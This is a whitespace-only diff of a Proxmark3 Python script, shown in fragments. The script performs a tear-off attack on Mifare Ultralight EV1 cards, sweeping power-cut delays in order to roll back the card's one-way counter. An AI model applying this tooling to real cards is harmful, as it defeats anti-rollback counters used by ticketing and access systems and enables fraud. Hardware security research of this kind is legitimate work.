@@ -67,7 +67,7 @@ def read_counter(counter_numb):
     counter_bytes = bytes.fromhex(counter)
     counter_int = int.from_bytes(counter_bytes, byteorder='little')
     return counter, counter_int
-    
+
 def enable_tearoff(delay):
     p.console(f"hw tearoff --delay {delay}")
     p.console("hw tearoff --on", capture=True)
@@ -96,12 +96,12 @@ def some_tests(counter_numb):
     except:
         print(f"[{color('!', 'red')}] Support only Mifare UL EV1 cards")
         return False
-    
+
     tearing = check_tearing_event(counter_number)[1]
     if tearing != "00" and tearing != "BD":
         print(f"[{color('!', 'red')}] Looks like you're card doesn't support CHECK_TEARING_EVENT")
         return False
-    
+
     counter_str, counter = read_counter(counter_number)
     if counter == 16777215:
         print(f"[{color('!', 'red')}] The counter value is at its maximum, it cannot be reset")
@@ -109,7 +109,7 @@ def some_tests(counter_numb):
     elif counter == 0:
         print(f"[{color('!', 'red')}] The counter value is already at the minimum level")
         return False
-    
+
     if counter_str[:4] == "0000":
         print(f"\n[{color('+', 'green')}] First two bytes set to 00, skip")
         byte = 3
@@ -123,7 +123,7 @@ if __name__ == "__main__":
     if not args.force and not some_tests(counter_number):
         print(f"[{color('?', 'goldenrod')}] Try `{color(f'script run {ProgramName} -f True', 'goldenrod')}` if this is a script bug", end="")
         sys.exit(0)
-    
+
     if args.DelayBD == None:
         for Delay_BD in range(1000, 5000, args.inc):
             initial_counter_str, initial_counter_int = read_counter(counter_number)
@@ -153,7 +153,7 @@ if __name__ == "__main__":
     else:
         Delay_00 = args.Delay00
         print(f"[{color('+', 'green')}] Work delay for 00: {color(Delay_00, 'green')} us")
-    
+
     constant_counter_int = read_counter(counter_number)[1]
     while True:
         initial_counter_str, initial_counter_int = read_counter(counter_number)
@@ -171,7 +171,7 @@ if __name__ == "__main__":
 
         final_counter_str, final_counter_int = read_counter(counter_number)
         check_tearing, check_tearing_clear = check_tearing_event(counter_number)
-        
+
         attempt+=1
         print(f"\r[{color('=', 'goldenrod')}] Attempt: {color(attempt, 'green')} | Delay BD/00: {color(Delay_BD, 'yellow')}/{color(Delay_00, 'yellow')} us | Check tearing: {color(check_tearing_clear, 'yellow')} | Counter changing: {color(initial_counter_str.upper(), 'red') if initial_counter_int <= final_counter_int else color(initial_counter_str.upper(), 'green')}==>{color(final_counter_str.upper(), 'red') if initial_counter_int <= final_counter_int else color(final_counter_str.upper(), 'green')}", end="", flush=True)
 
